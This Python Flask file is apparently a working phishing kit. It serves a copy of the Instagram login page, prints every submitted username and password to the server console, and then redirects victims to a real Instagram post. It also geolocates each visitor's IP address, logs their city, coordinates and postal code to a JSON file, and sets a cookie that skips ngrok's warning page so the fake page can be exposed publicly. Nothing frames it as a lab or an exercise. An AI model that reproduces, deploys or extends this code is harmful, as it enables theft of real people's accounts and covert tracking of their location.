import os
import sys
import json
from datetime import datetime
import geoip2.database
from flask import Flask, request, render_template_string, redirect, make_response


app = Flask(__name__)

# Define the absolute path to your downloaded local database file
DB_PATH = os.path.join(os.path.dirname(__file__), "GeoLite2-City.mmdb")

# ANSI Color Codes for terminal output
GREEN = "\033[32;1m"
YELLOW = "\033[33;1m"
WHITE = "\033[39;1m"
RED = "\033[31;1m"
RESET = "\033[0m"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
   <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: linear-gradient(135deg, #121212 0%, #1a1a2e 50%, #16213e 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      color: #e0e0e0;
      flex-direction: column;
    }

    h1 {
        font-size: 48px;
        color: linear-gradient(135deg, #7a9fff 0%, #5d7cff 100%);
        font-family: Billabong;
        padding-bottom: 0.6em;
        }

    .login-container {
      background: rgba(30, 30, 46, 0.7);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 40px 36px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
    }

    .logo {
      margin-bottom: 32px;
    }

    .logo svg {
      width: 200px;
      filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3));
    }

    .form-group {
      margin-bottom: 12px;
    }

    .form-control {
      width: 100%;
      padding: 14px 16px;
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.12);
      border-radius: 10px;
      font-size: 15px;
      color: #f0f0f0;
      outline: none;
      transition: all 0.2s ease;
    }

    .form-control::placeholder {
      color: #aaa;
    }

    .form-control:focus {
      border-color: #7a9fff;
      background: rgba(255, 255, 255, 0.12);
      box-shadow: 0 0 0 3px rgba(122, 159, 255, 0.15);
    }

    .btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #7a9fff 0%, #5d7cff 100%);
      color: #fff;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      font-size: 15px;
      margin-top: 18px;
      cursor: pointer;
      opacity: 0.7;
      transition: all 0.2s ease;
      box-shadow: 0 4px 12px rgba(93, 124, 255, 0.3);
    }

    .btn:enabled {
      opacity: 1;
    }

    .btn:enabled:hover {
      background: linear-gradient(135deg, #6a8eff 0%, #4c6cff 100%);
      transform: translateY(-1px);
      box-shadow: 0 6px 16px rgba(93, 124, 255, 0.4);
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 24px 0;
      color: #aaa;
      font-size: 14px;
      font-weight: 500;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: rgba(255, 255, 255, 0.15);
    }

    .divider::before {
      margin-right: 16px;
    }

    .divider::after {
      margin-left: 16px;
    }

    .links {
      margin-top: 20px;
      font-size: 13px;
    }

    .links a {
      color: #7a9fff;
      text-decoration: none;
      font-weight: 500;
    }

    .links a:hover {
      text-decoration: underline;
    }

    .signup-link {
      margin-top: 24px;
      font-size: 14px;
      color: #ccc;
      background: rgba(30, 30, 46, 0.7);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      padding: 20px;
      text-align: center;
      max-width: 380px;
      width: 100%;
    }

    .signup-link a {
      color: #7a9fff;
      font-weight: 600;
      text-decoration: none;
    }

    .signup-link a:hover {
      text-decoration: underline;
    }

    /* Subtle glow on containers for premium feel */
    .login-container, .signup-link {
      position: relative;
    }

    .login-container::before,
    .signup-link::before {
      content: "";
      position: absolute;
      top: -1px;
      left: -1px;
      right: -1px;
      bottom: -1px;
      background: linear-gradient(135deg, rgba(122, 159, 255, 0.1), rgba(93, 124, 255, 0.05));
      border-radius: 17px;
      z-index: -1;
      pointer-events: none;
    }

    .footer {
    color: gray;
    position: fixed;
    bottom: 10px;
    font-size: 12px;}
  </style>
</head>
<body>

<h1>Instagram</h1>
  <div class="login-container">
    <div class="logo">
      <img src="{{ url_for('static', filename='image.png') }}" alt="Logo">
    </div>

    <form id="login-form" action="/login" method="POST">
      <div class="form-group">
        <input type="text" class="form-control" name="username" placeholder="Phone number, username, or email" required>
      </div>
      <div class="form-group">
        <input type="password" class="form-control" name="password" placeholder="Password" required>
      </div>
      <button type="submit" class="btn" disabled>Log In</button>
    </form>

    <div class="divider">OR</div>

    <div class="links">
      <a href="#">Forgot password?</a>
    </div>
  </div>

  <div class="footer">
    <p>© 2026 Instagram from Meta</p>
  </div>

  <script>
    // Simple JS to enable button when both fields are filled
    const form = document.getElementById('login-form');
    const inputs = form.querySelectorAll('input');
    const button = form.querySelector('.btn');

    function checkInputs() {
      const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
      button.disabled = !allFilled;
    }

    inputs.forEach(input => {
      input.addEventListener('input', checkInputs);
    });
  </script>
</body>
</html>
"""

def trace_local_ip(ip_address):
    """Queries the local MMDB file for target IP geolocation data and appends it to a JSON log file."""
    if not os.path.exists(DB_PATH):
        print(f"{RED}[ERROR] Local database file not found at: {DB_PATH}{RESET}")
        print(f"{YELLOW}Please ensure 'GeoLite2-City.mmdb' is placed in this folder.{RESET}")
        return

    # Handle local loopback instances for standard browser safety
    if ip_address in ("127.0.0.1", "::1"):
        print(f"{YELLOW}[*] Local loopback detected ({ip_address}). Local database requires a public IP to resolve.{RESET}")
        return

    JSON_FILE = "visitor_logs.json"

    try:
        with geoip2.database.Reader(DB_PATH) as reader:
            response = reader.city(ip_address)
            
            # 1. Map absolutely every available data block inside the City DB
            log_entry = {
                "timestamp_utc": datetime.utcnow().isoformat(),
                "query_ip": ip_address,
                
                "continent": {
                    "name_en": response.continent.name,
                    "code": response.continent.code,
                    "geoname_id": response.continent.geoname_id
                },
                
                "country": {
                    "name_en": response.country.name,
                    "iso_code": response.country.iso_code,
                    "geoname_id": response.country.geoname_id,
                    "is_in_european_union": response.country.is_in_european_union,
                    "localizations": {
                        "es": response.country.names.get('es'),
                        "fr": response.country.names.get('fr'),
                        "ja": response.country.names.get('ja'),
                        "zh_CN": response.country.names.get('zh-CN')
                    }
                },
                
                "region": {
                    "name_en": response.subdivisions.most_specific.name if response.subdivisions else None,
                    "iso_code": response.subdivisions.most_specific.iso_code if response.subdivisions else None,
                    "geoname_id": response.subdivisions.most_specific.geoname_id if response.subdivisions else None
                },
                
                "city": {
                    "name_en": response.city.name,
                    "geoname_id": response.city.geoname_id,
                    "postal_code": response.postal.code
                },
                
                "geolocation": {
                    "latitude": response.location.latitude,
                    "longitude": response.location.longitude,
                    "accuracy_radius_km": response.location.accuracy_radius,
                    "time_zone": response.location.time_zone,
                    "metro_code": response.location.metro_code  # Only valid for US IPs
                }
            }
            
            # 2. Output maximum verbosity to the server terminal
            print(f"\n{YELLOW}[+]{WHITE} Full Data Stream Intercepted {YELLOW}>>>>>>>>>{RESET}")
            print(json.dumps(log_entry, indent=2))
            print(f"{YELLOW}[+]{WHITE} End of Stream Logged {YELLOW}>>>>>>>>>{RESET}\n")
            
            # 3. Handle persistent atomic JSON file appending
            if os.path.exists(JSON_FILE):
                with open(JSON_FILE, "r") as f:
                    try:
                        existing_logs = json.load(f)
                    except json.JSONDecodeError:
                        existing_logs = []
            else:
                existing_logs = []

            existing_logs.append(log_entry)
            
            with open(JSON_FILE, "w") as f:
                json.dump(existing_logs, f, indent=4)
                
    except geoip2.errors.AddressNotFoundError:
        print(f"{RED}[!] IP {ip_address} not found in local database.{RESET}")
    except Exception as e:
        print(f"{RED}[ERROR] Failed to read local database or write log: {e}{RESET}")

@app.route('/')
def index():
    # 1. Extract client IP through ngrok or reverse proxy
    if request.headers.get('X-Forwarded-For'):
    # Render's X-Forwarded-For contains a comma-separated list of IPs. 
    # The first one is ALWAYS the real visitor.
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        visitor_ip = request.remote_addr

    # 2. Execute the purely local lookup
    trace_local_ip(visitor_ip)
    
    # 3. Build a response object instead of returning a raw string
    response = make_response(render_template_string(HTML_TEMPLATE))
    
    # 4. Inject the bypass cookie so subsequent asset/page requests skip the ngrok wall
    response.set_cookie('ngrok-skip-browser-warning', 'true')
    
    return response



@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Print login data to console
    print("Login attempt:")
    print(f"Username/Email: {username}")
    print(f"Password: {password}")

    # Optional: You can add validation, database check, etc.
    # For now, just print and redirect or respond
    return redirect('https://www.instagram.com/p/DaJCSFHtHZ7/')

if __name__ == '__main__':
    app.run(debug=True)

if __name__ == "__main__":
    os.system('')
    print(f"{GREEN}[*] Initializing Unlimited Local Tracker...{RESET}")
    app.run(host="0.0.0.0", port=5000, debug=True)